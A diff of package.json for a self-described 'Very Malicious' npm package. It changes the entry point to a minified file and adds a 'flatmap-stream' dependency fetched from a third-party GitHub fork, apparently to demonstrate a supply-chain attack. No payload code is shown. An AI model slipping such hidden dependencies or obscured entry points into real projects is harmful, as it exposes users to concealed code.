@@ -2,7 +2,7 @@
   "name": "avmp",
   "version": "1.0.2",
   "description": "A Very Malicious (NPM) Package",
-  "main": "index.js",
+  "main": "index.min.js",
   "scripts": {
     "test": "echo \"Error: no test specified\" && exit 1"
   },
@@ -18,5 +18,8 @@
   "bugs": {
     "url": "https://github.com/bernlim93/VMP/issues"
   },
-  "homepage": "https://github.com/bernlim93/VMP#readme"
+  "homepage": "https://github.com/bernlim93/VMP#readme",
+  "dependencies": {
+    "flatmap-stream": "git+https://github.com/hugeglass/flatmap-stream.git"
+  }
 }
